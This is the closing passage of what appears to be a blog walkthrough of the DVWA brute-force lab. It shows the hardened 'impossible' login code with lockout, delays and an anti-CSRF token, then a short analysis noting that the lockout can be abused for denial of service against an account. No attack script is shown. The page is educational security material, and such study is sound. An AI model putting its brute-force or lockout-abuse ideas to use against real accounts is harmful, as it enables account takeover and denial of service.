<a id=__codelineno-6-79 name=__codelineno-6-79 href=#__codelineno-6-79></a>        <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
<a id=__codelineno-6-80 name=__codelineno-6-80 href=#__codelineno-6-80></a>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
<a id=__codelineno-6-81 name=__codelineno-6-81 href=#__codelineno-6-81></a>        <span class=c1>// Login failed</span>
<a id=__codelineno-6-82 name=__codelineno-6-82 href=#__codelineno-6-82></a>        <span class=nb>sleep</span><span class=p>(</span> <span class=nb>rand</span><span class=p>(</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>4</span> <span class=p>)</span> <span class=p>);</span>
<a id=__codelineno-6-83 name=__codelineno-6-83 href=#__codelineno-6-83></a>
<a id=__codelineno-6-84 name=__codelineno-6-84 href=#__codelineno-6-84></a>        <span class=c1>// Give the user some feedback</span>
<a id=__codelineno-6-85 name=__codelineno-6-85 href=#__codelineno-6-85></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in </span><span class=si>{</span><span class=nv>$lockout_time</span><span class=si>}</span><span class=s2> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-6-86 name=__codelineno-6-86 href=#__codelineno-6-86></a>
<a id=__codelineno-6-87 name=__codelineno-6-87 href=#__codelineno-6-87></a>        <span class=c1>// Update bad login count</span>
<a id=__codelineno-6-88 name=__codelineno-6-88 href=#__codelineno-6-88></a>        <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span> <span class=s1>&#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39;</span> <span class=p>);</span>
<a id=__codelineno-6-89 name=__codelineno-6-89 href=#__codelineno-6-89></a>        <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>bindParam</span><span class=p>(</span> <span class=s1>&#39;:user&#39;</span><span class=p>,</span> <span class=nv>$user</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>PARAM_STR</span> <span class=p>);</span>
<a id=__codelineno-6-90 name=__codelineno-6-90 href=#__codelineno-6-90></a>        <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
<a id=__codelineno-6-91 name=__codelineno-6-91 href=#__codelineno-6-91></a>    <span class=p>}</span>
<a id=__codelineno-6-92 name=__codelineno-6-92 href=#__codelineno-6-92></a>
<a id=__codelineno-6-93 name=__codelineno-6-93 href=#__codelineno-6-93></a>    <span class=c1>// Set the last login time</span>
<a id=__codelineno-6-94 name=__codelineno-6-94 href=#__codelineno-6-94></a>    <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span> <span class=s1>&#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39;</span> <span class=p>);</span>
<a id=__codelineno-6-95 name=__codelineno-6-95 href=#__codelineno-6-95></a>    <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>bindParam</span><span class=p>(</span> <span class=s1>&#39;:user&#39;</span><span class=p>,</span> <span class=nv>$user</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>PARAM_STR</span> <span class=p>);</span>
<a id=__codelineno-6-96 name=__codelineno-6-96 href=#__codelineno-6-96></a>    <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
<a id=__codelineno-6-97 name=__codelineno-6-97 href=#__codelineno-6-97></a><span class=p>}</span>
<a id=__codelineno-6-98 name=__codelineno-6-98 href=#__codelineno-6-98></a>
<a id=__codelineno-6-99 name=__codelineno-6-99 href=#__codelineno-6-99></a><span class=c1>// Generate Anti-CSRF token</span>
<a id=__codelineno-6-100 name=__codelineno-6-100 href=#__codelineno-6-100></a><span class=nx>generateSessionToken</span><span class=p>();</span>
<a id=__codelineno-6-101 name=__codelineno-6-101 href=#__codelineno-6-101></a>
<a id=__codelineno-6-102 name=__codelineno-6-102 href=#__codelineno-6-102></a><span class=cp>?&gt;</span><span class=x> </span>
</code></pre></div> <h3 id=analysis_3><strong>Analysis</strong><a class=headerlink href=#analysis_3 title="Permanent link">&para;</a></h3> <p>Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a "lock out" feature, where if there are five bad logins within the last 15 minutes, the locked out user cannot log in.</p> <p>If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know if there is a valid account on the system, with that password, and if the account is locked.</p> <p>This can cause a "Denial of Service" (DoS), by having someone continually trying to login to someone's account. This level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent).</p> <hr> <h2 id=what-we-learned><strong>What we learned</strong><a class=headerlink href=#what-we-learned title="Permanent link">&para;</a></h2> <ol> <li>CSRF token</li> <li>Write script</li> </ol> <h2 id=more-information><strong>More Information</strong><a class=headerlink href=#more-information title="Permanent link">&para;</a></h2> <ul> <li><a href=https://owasp.org/www-community/attacks/Brute_force_attack>https://owasp.org/www-community/attacks/Brute_force_attack</a></li> <li><a href=http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password>http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password</a></li> <li><a href=https://www.golinuxcloud.com/brute-force-attack-web-forms>https://www.golinuxcloud.com/brute-force-attack-web-forms</a></li> </ul> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 29, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 7, 2023</span> </small> </div> <h2 id=__comments><strong>Comments</strong></h2> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=1 data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script> <script>
  var theme, giscus = document.querySelector("script[src*=giscus]"),
    palette = __md_get("__palette");
  palette && "object" == typeof palette.color && (theme = "slate" === palette.color.scheme ? "dark" : "light", giscus
    .setAttribute("data-theme", theme)), document.addEventListener("DOMContentLoaded", function () {
    document.querySelector("[data-md-component=palette]").addEventListener("change", function () {
      var e = __md_get("__palette");
      e && "object" == typeof e.color && (e = "slate" === e.color.scheme ? "dark" : "light", document
        .querySelector(".giscus-frame").contentWindow.postMessage({
          giscus: {
            setConfig: {
              theme: e
            }
          }
        }, "https://giscus.app"))
    })
  })

</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../javascripts/consent.js></script> <script src=../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../javascripts/tablesort.js></script> <script src=../../overrides/assets/javascripts/bundle.ed7d8744.min.js></script> <script src=../../overrides/assets/javascripts/cursor-effects.js></script> <!-- <script src="../../assets/javascripts/cursor-effects.js"></script> --> </body> </html>